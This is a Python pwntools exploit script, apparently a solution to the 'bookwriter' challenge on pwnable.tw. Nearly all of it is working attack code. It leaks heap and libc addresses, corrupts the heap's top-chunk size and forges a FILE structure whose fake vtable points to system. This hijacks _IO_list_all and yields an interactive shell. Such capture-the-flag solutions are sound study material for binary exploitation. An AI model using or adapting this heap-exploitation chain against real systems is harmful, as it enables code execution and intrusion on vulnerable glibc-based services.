#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g  -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so '.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './bookwriter'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('chall.pwnable.tw', 10304)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/glibc/glibc-2.23/debug_x64/lib/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    define pr
        x/16gx 0x6020A0
        end
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)
    
def Add(size, content):
    sh.sendlineafter('Your choice :', '1')
    sh.sendlineafter('Size of page :', str(size))
    sh.sendafter('Content :', content)

def Edit(index, content):
    sh.sendlineafter('Your choice :', '3')
    sh.sendlineafter('Index of page :', str(index))
    sh.sendafter('Content:', content)

def View(index):
    sh.sendlineafter('Your choice :', '2')
    sh.sendlineafter('Index of page :', str(index))

sh.sendafter('Author :', 'a' * 0x40)
sh.sendlineafter('Your choice :', '4')
sh.sendlineafter('(yes:1 / no:0) ', '0')

Add(0x1fdc0, '\n')
Add(0x18, '\n')


sh.sendlineafter('Your choice :', '4')
sh.recvuntil('a' * 0x40)
result = sh.recvline()[:-1]
heap_addr = u64(result.ljust(8, '\0')) - 0x1020
log.success('heap_addr: ' + hex(heap_addr))

sh.sendlineafter('(yes:1 / no:0) ', '0')

Edit(1, 'b' * 0x18)
Edit(1, 'b' * 0x18 + p16(0x201))
Add(0xff8, 'a' * 0xf0 + p64(0x1300) + p64(0xf00)) # fake chunk
Edit(1, 'b' * 0x18 + p16(0x1301))

Add(0x1278, 'e' * 8)

View(3)
sh.recvuntil('e' * 8)

result = sh.recvline()[:-1]
main_arena_addr = u64(result.ljust(8, '\0')) - 0x688
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - libc.symbols['__malloc_hook'] - 0x10
log.success('libc_addr: ' + hex(libc_addr))

layout = [
    'z' * 0x70,
    '/bin/sh\0', p64(0x61),
    p64(0), p64(libc_addr + libc.symbols['_IO_list_all'] - 0x10),
    p64(2), p64(3),

    'z' * 8, p64(0), # vtable
    p64(0), p64(libc_addr + libc.symbols['system']),

    'z' * 0x70,
    p64(0), p64(0),
    p64(0), p64(heap_addr + 0x220b0), # vtable_ptr
]

Edit(2, flat(layout))

# pause()
sh.sendlineafter('Your choice :', '1')
sh.sendlineafter('Size of page :', str(8))

sh.sendline('echo -n hello')
if(sh.recvn(5) != 'hello'):
    raise Exception('no shell')

sh.interactive()
clear()

